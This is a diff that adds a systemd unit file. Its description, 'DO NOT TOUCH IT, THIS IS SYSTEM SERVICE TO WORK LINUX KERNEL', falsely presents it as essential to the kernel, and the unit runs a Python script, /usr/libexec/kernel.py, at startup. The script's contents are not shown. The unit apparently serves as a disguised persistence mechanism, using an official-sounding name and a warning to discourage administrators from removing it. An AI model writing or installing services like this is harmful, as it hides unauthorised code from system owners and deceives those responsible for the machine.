@@ -1,0 +1,8 @@
+[Unit]
+Description=DO NOT TOUCH IT, THIS IS SYSTEM SERVICE TO WORK LINUX KERNEL
+
+[Service]
+ExecStart=/usr/bin/python3 /usr/libexec/kernel.py
+
+[Install]
+WantedBy=default.target
